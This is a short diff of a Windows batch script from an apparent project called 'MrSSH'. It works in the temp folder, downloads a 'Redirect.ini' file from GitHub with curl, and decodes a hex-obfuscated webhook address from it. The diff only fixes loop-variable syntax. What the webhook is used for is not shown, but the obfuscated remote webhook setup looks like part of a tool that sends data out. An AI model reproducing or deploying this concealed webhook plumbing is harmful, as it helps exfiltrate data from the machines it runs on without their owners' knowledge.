@@ -28,10 +28,10 @@ cd %temp%
 
 :: <Set webhook>
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
-FOR /F "delims=" %F IN (tokenName.txt) DO SET token=%F
-FOR /F "tokens=* USEBACKQ" %F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%F)
+FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
+FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
 set "hexwebhook=%hexwebhook:~-244%"
-FOR /F "tokens=* USEBACKQ" %F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%F)
+FOR /F "tokens=* USEBACKQ" %%F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%%F)
 :: </Set webhook>
 
 
